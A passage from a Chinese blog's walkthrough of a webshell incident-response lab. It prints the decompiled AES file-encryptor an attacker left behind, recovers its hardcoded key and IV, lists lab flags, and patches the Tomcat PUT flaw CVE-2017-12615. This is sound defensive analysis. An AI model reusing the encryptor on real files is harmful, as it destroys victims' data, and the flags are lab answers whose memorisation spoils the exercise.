class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">main</span><span class="params">(<span class="keyword">int</span> a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  FILE *v4; <span class="comment">// r12</span></span><br><span class="line">  FILE *v5; <span class="comment">// r13</span></span><br><span class="line">  <span class="keyword">char</span> *v6; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">char</span> v7; <span class="comment">// dl</span></span><br><span class="line">  <span class="keyword">char</span> *v8; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">char</span> v9; <span class="comment">// dl</span></span><br><span class="line">  <span class="keyword">size_t</span> v10; <span class="comment">// rax</span></span><br><span class="line">  __int64 v11; <span class="comment">// rdx</span></span><br><span class="line">  <span class="keyword">char</span> *v12; <span class="comment">// rax</span></span><br><span class="line">  __int64 v13; <span class="comment">// rcx</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v14; <span class="comment">// rsi</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v15; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v16; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v17; <span class="comment">// edx</span></span><br><span class="line">  __int64 v18; <span class="comment">// rdi</span></span><br><span class="line">  _BYTE v19[<span class="number">16</span>]; <span class="comment">// [rsp+0h] [rbp-178h] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> ptr[<span class="number">16</span>]; <span class="comment">// [rsp+10h] [rbp-168h] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> v21[<span class="number">16</span>]; <span class="comment">// [rsp+20h] [rbp-158h] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> v22[<span class="number">16</span>]; <span class="comment">// [rsp+30h] [rbp-148h] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> v23[<span class="number">312</span>]; <span class="comment">// [rsp+40h] [rbp-138h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( a1 == <span class="number">3</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v4 = fopen(a2[<span class="number">1</span>], <span class="string">"rb"</span>);</span><br><span class="line">    <span class="keyword">if</span> ( v4 )</span><br><span class="line">    &#123;</span><br><span class="line">      v5 = fopen(a2[<span class="number">2</span>], <span class="string">"wb"</span>);</span><br><span class="line">      <span class="keyword">if</span> ( v5 )</span><br><span class="line">      &#123;</span><br><span class="line">        v6 = v19;</span><br><span class="line">        <span class="keyword">do</span></span><br><span class="line">        &#123;</span><br><span class="line">          v7 = <span class="string">'A'</span> - (<span class="keyword">unsigned</span> __int8)v19 + (_BYTE)v6++;</span><br><span class="line">          *(v6 - <span class="number">1</span>) = v7;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span> ( v6 != ptr );</span><br><span class="line">        v8 = ptr;</span><br><span class="line">        <span class="keyword">do</span></span><br><span class="line">        &#123;</span><br><span class="line">          v9 = <span class="string">'a'</span> - (<span class="keyword">unsigned</span> __int8)ptr + (_BYTE)v8++;</span><br><span class="line">          *(v8 - <span class="number">1</span>) = v9;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span> ( v8 != v21 );</span><br><span class="line">        AES_set_encrypt_key((__int64)v19, <span class="number">0x80</span>LL, (__int64)v23);</span><br><span class="line">        fwrite(ptr, <span class="number">1u</span>LL, <span class="number">0x10</span>uLL, v5);</span><br><span class="line">        <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          v10 = fread(v21, <span class="number">1u</span>LL, <span class="number">0x10</span>uLL, v4);</span><br><span class="line">          <span class="keyword">if</span> ( !v10 )</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">          <span class="keyword">if</span> ( v10 &lt;= <span class="number">0xF</span> )</span><br><span class="line">          &#123;</span><br><span class="line">            v11 = (<span class="keyword">unsigned</span> <span class="keyword">int</span>)(<span class="number">16</span> - v10);</span><br><span class="line">            v12 = &amp;v21[v10];</span><br><span class="line">            v13 = <span class="number">0x101010101010101</span>LL * (<span class="keyword">unsigned</span> __int8)v11;</span><br><span class="line">            <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)v11 &gt;= <span class="number">8</span> )</span><br><span class="line">            &#123;</span><br><span class="line">              *(_QWORD *)v12 = v13;</span><br><span class="line">              *(_QWORD *)&amp;v12[(<span class="keyword">unsigned</span> <span class="keyword">int</span>)v11 - <span class="number">8</span>] = v13;</span><br><span class="line">              v14 = (<span class="keyword">unsigned</span> __int64)(v12 + <span class="number">8</span>) &amp; <span class="number">0xFFFFFFFFFFFFFFF8</span>LL;</span><br><span class="line">              v15 = (v11 + (_DWORD)v12 - v14) &amp; <span class="number">0xFFFFFFF8</span>;</span><br><span class="line">              <span class="keyword">if</span> ( v15 &gt;= <span class="number">8</span> )</span><br><span class="line">              &#123;</span><br><span class="line">                v16 = v15 &amp; <span class="number">0xFFFFFFF8</span>;</span><br><span class="line">                v17 = <span class="number">0</span>;</span><br><span class="line">                <span class="keyword">do</span></span><br><span class="line">                &#123;</span><br><span class="line">                  v18 = v17;</span><br><span class="line">                  v17 += <span class="number">8</span>;</span><br><span class="line">                  *(_QWORD *)(v14 + v18) = v13;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">while</span> ( v17 &lt; v16 );</span><br><span class="line">              &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> ( (v11 &amp; <span class="number">4</span>) != <span class="number">0</span> )</span><br><span class="line">            &#123;</span><br><span class="line">              *(_DWORD *)v12 = v13;</span><br><span class="line">              *(_DWORD *)&amp;v12[v11 - <span class="number">4</span>] = v13;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> ( (_DWORD)v11 )</span><br><span class="line">            &#123;</span><br><span class="line">              *v12 = v11;</span><br><span class="line">              <span class="keyword">if</span> ( (v11 &amp; <span class="number">2</span>) != <span class="number">0</span> )</span><br><span class="line">                *(_WORD *)&amp;v12[v11 - <span class="number">2</span>] = v13;</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">          AES_cbc_encrypt(v21, v22, <span class="number">16L</span>L, v23, ptr, <span class="number">1L</span>L);</span><br><span class="line">          fwrite(v22, <span class="number">1u</span>LL, <span class="number">0x10</span>uLL, v5);</span><br><span class="line">        &#125;</span><br><span class="line">        fclose(v4);</span><br><span class="line">        fclose(v5);</span><br><span class="line">        <span class="built_in">puts</span>(&amp;s);</span><br><span class="line">        <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">          ;</span><br><span class="line">      &#125;</span><br><span class="line">      perror(&amp;byte_2051);</span><br><span class="line">      fclose(v4);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      perror(&amp;byte_2035);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, &amp;format, *a2);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1L</span>L;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>经过审计后发现aes加密的key 主要由 v19 变量存放，IV主要由ptr变量存放。</p>
+<p>题目很友好，在代码中加入<code>fwrite(ptr, 1uLL, 0x10uLL, v5);</code> 所以我们看到加密文件的前16个可见字符·<code>abcdefghijklmnop</code> 就是IV。</p>
+<p>v19 是由下面这段代码来着控制：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">v6 = v19;</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">&#123;</span><br><span class="line">  v7 = <span class="string">'A'</span> - (<span class="keyword">unsigned</span> __int8)v19 + (_BYTE)v6++;</span><br><span class="line">  *(v6 - <span class="number">1</span>) = v7;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">while</span> ( v6 != ptr );</span><br><span class="line">v8 = ptr;</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">&#123;</span><br><span class="line">  v9 = <span class="string">'a'</span> - (<span class="keyword">unsigned</span> __int8)ptr + (_BYTE)v8++;</span><br><span class="line">  *(v8 - <span class="number">1</span>) = v9;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>由于v6 的定义 <code>char *v6</code>指针，ptr是一个字符串数组一定程度上看是地址指针指向一个字符串。<code>(_BYTE)v6++</code>相当v6=v6+1.</p>
+<p>因此 while ( v6 != ptr ); 结束条件是 v6的值与ptr相等，v6指向v19，v19与ptr相近偏移刚好为16.  v19字符数组值在执行循环时又刚好全为0。因此核心逻辑大致可以还原为如下的：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> v6 = <span class="number">0</span>; v6 &lt; <span class="number">16</span>; v6++) &#123;</span><br><span class="line">    v19[v6] = <span class="number">65</span> + v6;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>得到key为<code>ABCDEFGHIJKLMNOP</code> ,从而求解得到flag</p>
+<p><img src="./image-20250211174445135.png" alt="image-20250211174445135"></p>
+<p>flag：<code>flag{0ba9af0100c01e88a3a1280ec5b39715}</code></p>
+<h3 id="请你找到并修复入口漏洞后运行-root下的check-tomcat文件并将得到flag提交"><a href="#请你找到并修复入口漏洞后运行-root下的check-tomcat文件并将得到flag提交" class="headerlink" title="请你找到并修复入口漏洞后运行/root下的check_tomcat文件并将得到flag提交"></a>请你找到并修复入口漏洞后运行/root下的check_tomcat文件并将得到flag提交</h3><p>之前我们在分析时，发现黑客使用 cve-2017-12615-rce 来进行入侵的。cve-2017-1261入侵的前提是 Tomcat 启用了 HTTP PUT 请求方法 readonly 初始化参数由默认值设置为 false。</p>
+<p>因此我们可以修改 路径为<code>/opt/apache-tomcat-8.5.19/conf/web.xml</code> 文件里的<code>org.apache.catalina.servlets.DefaultServlet</code>的 readonly  为True  或直接删除（Apache Tomcat的web.xml中org.apache.catalina.servlets.DefaultServlet`的 readonly 默认为 true，而且默认没有在 conf/web.xml 里写）</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">    &lt;servlet&gt;</span><br><span class="line">        &lt;servlet-name&gt;default&lt;&#x2F;servlet-name&gt;</span><br><span class="line">        &lt;servlet-class&gt;org.apache.catalina.servlets.DefaultServlet&lt;&#x2F;servlet-class&gt;</span><br><span class="line">        &lt;init-param&gt;</span><br><span class="line">            &lt;param-name&gt;debug&lt;&#x2F;param-name&gt;</span><br><span class="line">            &lt;param-value&gt;0&lt;&#x2F;param-value&gt;</span><br><span class="line">        &lt;&#x2F;init-param&gt;</span><br><span class="line">        &lt;init-param&gt;</span><br><span class="line">            &lt;param-name&gt;listings&lt;&#x2F;param-name&gt;</span><br><span class="line">            &lt;param-value&gt;true&lt;&#x2F;param-value&gt;</span><br><span class="line">        &lt;&#x2F;init-param&gt;</span><br><span class="line">&lt;init-param&gt;&lt;param-name&gt;readonly&lt;&#x2F;param-name&gt;&lt;param-value&gt;true&lt;&#x2F;param-value&gt;&lt;&#x2F;init-param&gt;</span><br><span class="line">        &lt;load-on-startup&gt;1&lt;&#x2F;load-on-startup&gt;</span><br><span class="line">    &lt;&#x2F;servlet&gt;</span><br></pre></td></tr></table></figure>
+
+<p>然后运行root目录下的check_tomcat 即可得到flag</p>
+<p><img src="./image-20250211165252842.png" alt="image-20250211165252842"></p>
+<p>flag：<code>flag{ba5579c780bf4a799e03a60c6be383e9}</code></p>
+<p>ps：还百度一个方法是修改web.xml配置禁用put但是很奇怪题目环境里没成功，操作是增加以下内容，并重启tomcat服务：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">&lt;security-constraint&gt;</span><br><span class="line"></span><br><span class="line">   &lt;web-resource-collection&gt;</span><br><span class="line"></span><br><span class="line">      &lt;url-pattern&gt;&#x2F;*&lt;&#x2F;url-pattern&gt;</span><br><span class="line"></span><br><span class="line">      &lt;http-method&gt;PUT&lt;&#x2F;http-method&gt;</span><br><span class="line"></span><br><span class="line">&lt;http-method&gt;DELETE&lt;&#x2F;http-method&gt;</span><br><span class="line"></span><br><span class="line">&lt;http-method&gt;HEAD&lt;&#x2F;http-method&gt;</span><br><span class="line"></span><br><span class="line">&lt;http-method&gt;OPTIONS&lt;&#x2F;http-method&gt;</span><br><span class="line"></span><br><span class="line">&lt;http-method&gt;TRACE&lt;&#x2F;http-method&gt;</span><br><span class="line"></span><br><span class="line">   &lt;&#x2F;web-resource-collection&gt;</span><br><span class="line"></span><br><span class="line">   &lt;auth-constraint&gt;</span><br><span class="line"></span><br><span class="line">   &lt;&#x2F;auth-constraint&gt;</span><br><span class="line"></span><br><span class="line"> &lt;&#x2F;security-constraint&gt;</span><br><span class="line"></span><br><span class="line"> &lt;login-config&gt;</span><br><span class="line"></span><br><span class="line">   &lt;auth-method&gt;BASIC&lt;&#x2F;auth-method&gt;</span><br><span class="line"></span><br><span class="line"> &lt;&#x2F;login-config&gt;</span><br></pre></td></tr></table></figure>
+
+<h3 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h3><p><a href="https://mp.weixin.qq.com/s?__biz=MzkyNzcxNTczNA==&amp;mid=2247486297&amp;idx=1&amp;sn=8de65caed3d75322d7e2eda8ab4e8c0a&amp;source=41#wechat_redirect" target="_blank" rel="noopener">https://mp.weixin.qq.com/s?__biz=MzkyNzcxNTczNA==&amp;mid=2247486297&amp;idx=1&amp;sn=8de65caed3d75322d7e2eda8ab4e8c0a&amp;source=41#wechat_redirect</a></p>
+<p><a href="http://timd.cn/decrypting-https/key-log/" target="_blank" rel="noopener">http://timd.cn/decrypting-https/key-log/</a></p>
+
+      
+    </div>
+    
+  </div>
+  
+    
+    <div class="copyright">
+        <p><span>本文标题:</span><a href="/2025/02/28/%E6%9F%90%E5%8F%98%E5%BC%82Webshell%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90-%E7%8E%84%E6%9C%BA%E9%9D%B6%E5%9C%BA/">某变异Webshell流量分析-玄机靶场</a></p>
+        <p><span>文章作者:</span><a href="/" title="回到主页">lexsd6</a></p>
+        <p><span>发布时间:</span>2025-02-28, 22:54:57</p>
+        <p><span>最后更新:</span>2025-02-28, 23:00:10</p>
+        <p>
+            <span>原始链接:</span><a class="post-url" href="/2025/02/28/%E6%9F%90%E5%8F%98%E5%BC%82Webshell%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90-%E7%8E%84%E6%9C%BA%E9%9D%B6%E5%9C%BA/" title="某变异Webshell流量分析-玄机靶场">lexsd6.github.io/2025/02/28/%E6%9F%90%E5%8F%98%E5%BC%82Webshell%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90-%E7%8E%84%E6%9C%BA%E9%9D%B6%E5%9C%BA/</a>
+            <span class="copy-path" data-clipboard-text="原文: lexsd6.github.io/2025/02/28/%E6%9F%90%E5%8F%98%E5%BC%82Webshell%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90-%E7%8E%84%E6%9C%BA%E9%9D%B6%E5%9C%BA/　　作者: lexsd6" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
+            <script> var clipboard = new Clipboard('.copy-path'); </script>
+        </p>
+        <p>
+            <span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license noopener" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank" title="CC BY-NC-SA 4.0 International" target = "_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
+        </p>
+    </div>
+
+
+
+    <nav id="article-nav">
+        
+        
+            <div id="article-nav-older" class="article-nav-title">
+                <a href="/2024/12/27/House%20of%20apple2%20%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">
+                    House of apple2 学习笔记
+                </a>
+            </div>
+        
+    </nav>
+
+
+
+  
+
+  <!-- code.copy.start -->
+	 <!-- 
+<script src="/js/clipboard.js"></script>
+  -->
+	 <!-- 
+<script src="/js/jquery.min.js"></script>
+ -->
+	 <!-- 
+<script src="/js/clipboard_use.js"></script>
+ -->
+	<script type="text/javascript" src="/js/clipboard.js"></script>
+ 	<script type="text/javascript" src="/js/jquery.min.js"></script>
+	<script type="text/javascript" src="/js/clipboard_use.js"></script>
+
+    <!-- code.copy.end -->
+</article>
+
+
+    <div id="toc" class="toc-article">
+        <strong class="toc-title">文章目录</strong>
+        
+            <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#某变异Webshell流量分析-玄机靶场"><span class="toc-text">某变异Webshell流量分析-玄机靶场</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#立足点获取"><span class="toc-text">立足点获取</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#黑客上传的木马文件名是什么"><span class="toc-text">黑客上传的木马文件名是什么</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#黑客上传的木马连接密码是什么"><span class="toc-text">黑客上传的木马连接密码是什么</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#分析黑客上传的木马，找到木马通讯的key是什么"><span class="toc-text">分析黑客上传的木马，找到木马通讯的key是什么</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#黑客连接webshell后第一个执行的命令是什么"><span class="toc-text">黑客连接webshell后第一个执行的命令是什么</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#这个webshell是怎么进行回显的"><span class="toc-text">这个webshell是怎么进行回显的</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#黑客留下后面的反连接IP和PORT是什么"><span class="toc-text">黑客留下后面的反连接IP和PORT是什么</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#黑客通过后门反连接执行对第一条命令是什么"><span class="toc-text">黑客通过后门反连接执行对第一条命令是什么</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#后记1"><span class="toc-text">后记1</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#请上机排查黑客新增对后门程序会链接到哪台恶意主机"><span class="toc-text">请上机排查黑客新增对后门程序会链接到哪台恶意主机</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#后记2"><span class="toc-text">后记2</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#黑客加密一个-root目录下一个重要文件，请叫解密后的文件内容作为flag提交"><span class="toc-text">黑客加密一个&#x2F;root目录下一个重要文件，请叫解密后的文件内容作为flag提交</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#请你找到并修复入口漏洞后运行-root下的check-tomcat文件并将得到flag提交"><span class="toc-text">请你找到并修复入口漏洞后运行&#x2F;root下的check_tomcat文件并将得到flag提交</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#参考文献"><span class="toc-text">参考文献</span></a></li></ol></li></ol></li></ol>
+        
+    </div>
+    <style>
+        .left-col .switch-btn,
+        .left-col .switch-area {
+            display: none;
+        }
+        .toc-level-4 i,
+        .toc-level-4 ol {
+            display: none !important;
+        }
+    </style>
+
+    <input type="button" id="tocButton" value="隐藏目录"  title="点击按钮隐藏或者显示文章目录">
+
+    <script>
+        yiliaConfig.toc = ["隐藏目录", "显示目录", !!"false"];
+    </script>
+
+
+
+    
+<div class="share">
+    
+        <div class="bdsharebuttonbox">
+            <a href="#" class="fa fa-twitter bds_twi" data-cmd="twi" title="分享到推特"></a>
+            <a href="#" class="fa fa-weibo bds_tsina" data-cmd="tsina" title="分享到新浪微博"></a>
+            <a href="#" class="fa fa-qq bds_sqq" data-cmd="sqq" title="分享给 QQ 好友"></a>
+            <a href="#" class="fa fa-files-o bds_copy" data-cmd="copy" title="复制网址"></a>
+            <a href="#" class="fa fa fa-envelope-o bds_mail" data-cmd="mail" title="通过邮件分享"></a>
+            <a href="#" class="fa fa-weixin bds_weixin" data-cmd="weixin" title="生成文章二维码"></a>
+            <a href="#" class="fa fa-share-alt bds_more" data-cmd="more"></i></a>
+        </div>
+        <script>
+            window._bd_share_config={
+                "common":{"bdSnsKey":{},"bdText":"某变异Webshell流量分析-玄机靶场　| lexsd6's home　","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
+        </script>
+    
+
+    
+</div>
+
+
+
+
+
+
+
+    
+      <section class="livere" id="comments">
+    <!-- 来必力City版安装代码 -->
+    <div id="lv-container" data-id="city" data-uid="MTAyMC81NDYyMC8zMTA5MQ==">
+    <script type="text/javascript">
+   (function(d, s) {
+       var j, e = d.getElementsByTagName(s)[0];
+	
+       if (typeof LivereTower === 'function') { return; }
+
+       j = d.createElement(s);
+       j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
+       j.async = true;
+
+       e.parentNode.insertBefore(j, e);
+	
+       })(document, 'script');
+	
+    </script>
+    <noscript> 为正常使用来必力评论功能请激活JavaScript</noscript>
+
+	</div>
+
+    <!-- City版安装代码已完成 -->
+<script type="text/javascript">
+    
+setInterval(function () {
+    var box = document.querySelector(".trc_rbox_container");
+    if(box) box.outerHTML = "";
+}, 2000);
+document.getElementById("taboola-livere").style='display:none';
+</script>
+</section>
+    
+
+
+
+
+    <div class="scroll" id="post-nav-button">
+        
+            <a href="/" title="回到主页"><i class="fa fa-home"></i></a>
+        
+
+        <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
+
+        
+            <a href="/2024/12/27/House%20of%20apple2%20%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" title="下一篇: House of apple2 学习笔记">
+                <i class="fa fa-angle-right"></i>
+            </a>
+        
+    </div>
+
+    <ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2025/02/28/%E6%9F%90%E5%8F%98%E5%BC%82Webshell%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90-%E7%8E%84%E6%9C%BA%E9%9D%B6%E5%9C%BA/">某变异Webshell流量分析-玄机靶场</a></li><li class="post-list-item"><a class="post-list-link" href="/2024/12/27/House%20of%20apple2%20%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">House of apple2 学习笔记</a></li><li class="post-list-item"><a class="post-list-link" href="/2024/07/10/%E7%AC%AC%E4%BA%8C%E7%AB%A0%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90-mysql-%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-%E7%8E%84%E6%9C%BA%E9%9D%B6%E5%9C%BA/">第二章日志分析-mysql-应急响应-玄机靶场</a></li><li class="post-list-item"><a class="post-list-link" href="/2024/07/10/%E7%AC%AC%E4%B8%89%E7%AB%A0-%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81-linux%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81-%E9%9A%90%E8%97%8F/">第三章 权限维持-linux权限维持-隐藏-玄机靶场</a></li><li class="post-list-item"><a class="post-list-link" href="/2024/07/10/%E7%AC%AC%E4%BA%8C%E7%AB%A0%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90-redis%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-%E7%8E%84%E6%9C%BA%E9%9D%B6%E5%9C%BA/">第二章日志分析-redis应急响应-玄机靶场</a></li><li class="post-list-item"><a class="post-list-link" href="/2024/07/10/%E7%AC%AC%E4%B8%80%E7%AB%A0-%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-Linux%E5%85%A5%E4%BE%B5%E6%8E%92%E6%9F%A5-%E7%8E%84%E6%9C%BA%E9%9D%B6%E5%9C%BA/">第一章-应急响应-Linux入侵排查-玄机靶场</a></li><li class="post-list-item"><a class="post-list-link" href="/2024/07/10/%E7%AC%AC%E4%B8%80%E7%AB%A0-%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-webshell%E6%9F%A5%E6%9D%80-%E7%8E%84%E6%9C%BA%E9%9D%B6%E5%9C%BA/">第一章-应急响应-webshell查杀-玄机靶场</a></li><li class="post-list-item"><a class="post-list-link" href="/2024/07/10/%E7%AC%AC%E4%B8%80%E7%AB%A0/">第一章-应急响应-Linux 日志分析-玄机靶场</a></li><li class="post-list-item"><a class="post-list-link" href="/2024/07/10/%E7%AC%AC%E4%BA%8C%E7%AB%A0-/">第二章-日志分析-apache日志分析-玄机靶场</a></li><li class="post-list-item"><a class="post-list-link" href="/2024/02/15/%E4%BB%8EHTB%20_Arms_roped%E5%88%9D%E8%AF%86arm%E6%9E%B6%E6%9E%84/">从HTB _Arms_roped初识arm架构和qemu</a></li><li class="post-list-item"><a class="post-list-link" href="/2023/10/07/Python2%20%E7%8E%AF%E5%A2%83%E5%9C%A8ubuntu22.04%20%E9%85%8D%E7%BD%AE/">在ubuntu22.04配置Python2环境</a></li><li class="post-list-item"><a class="post-list-link" href="/2023/09/22/msql%E6%95%B0%E6%8D%AE%E5%BA%93-udf-%E6%8F%90%E6%9D%83%E5%A7%BF%E5%8A%BF%E5%AD%A6%E4%B9%A0/">msql数据库-udf-提权姿势学习</a></li><li class="post-list-item"><a class="post-list-link" href="/2023/04/20/python-sandbox%20bypass%20'()'%20to%20%20runing%20function/">Python-sandbox bypass '(' and ')' to  calling function</a></li><li class="post-list-item"><a class="post-list-link" href="/2023/01/29/ELF%E6%96%87%E4%BB%B6%E8%A7%A3%E6%9E%90--Program%20header/">ELF文件解析--Program header</a></li><li class="post-list-item"><a class="post-list-link" href="/2023/01/07/ELF%E6%96%87%E4%BB%B6%E5%A4%B4%E8%A7%A3%E6%9E%90%E5%AD%A6%E4%B9%A0/">ELF文件解析--ELF header 分析</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/10/16/decrypt_safe_linking/">how2heap-decrypt_safe_linking学习</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/10/02/2022%E5%B7%9D%E6%B8%9D%E8%81%8C%E4%B8%9A%E6%8A%80%E8%83%BD%E7%AB%9E%E8%B5%9B%E5%88%9D%E8%B5%9B--hard_login/">2022川渝职业技能竞赛初赛--hard_login</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/09/14/%E5%B7%9D%E6%B8%9D%E4%B8%AA%E4%BA%BA%E8%B5%9B-wp/">2022川渝个人赛-wp</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/07/26/%E6%90%9C%E7%B4%A2%E5%BC%95%E6%93%8E%E8%AF%AD%E6%B3%95%E5%AD%A6%E4%B9%A0/">搜索引擎语法学习</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/06/17/how2heap-fastbin_reverse_into_tcache-%E5%AD%A6%E4%B9%A0/">how2heap-fastbin_reverse_into_tcache-学习</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/06/15/how2heap-house_of_botcake-%E5%AD%A6%E4%B9%A0/">how2heap-house_of_botcake-学习</a></li><li class="post-list-item"><a class="post-list-link" 